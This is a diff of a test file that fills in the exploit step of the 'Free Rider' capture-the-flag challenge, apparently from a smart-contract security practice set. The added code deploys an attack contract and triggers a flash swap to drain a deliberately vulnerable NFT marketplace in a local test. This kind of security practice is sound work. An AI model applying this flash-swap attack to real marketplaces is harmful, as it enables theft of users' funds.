@@ -105,6 +105,21 @@ describe('[Challenge] Free Rider', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+        const attackWeth = this.weth.connect(attacker);
+        const attackToken = this.token.connect(attacker);
+        const attackFactory = this.uniswapFactory.connect(attacker);
+        const attackMarketplace = this.marketplace.connect(attacker);
+        const attackBuyer = this.buyerContract.connect(attacker);
+        const attackNft = this.nft.connect(attacker);
+
+        
+        const FreeRiderAttack = await ethers.getContractFactory("FreeRiderAttack", attacker);
+        const freeRiderAttack = await FreeRiderAttack.deploy(attackWeth.address, attackFactory.address,attackToken.address,attackMarketplace.address,attackBuyer.address,attackNft.address,);
+
+        await freeRiderAttack.flashSwap(attackWeth.address, NFT_PRICE, {
+            gasLimit: 1e6
+        });
+
     });
 
     after(async function () {
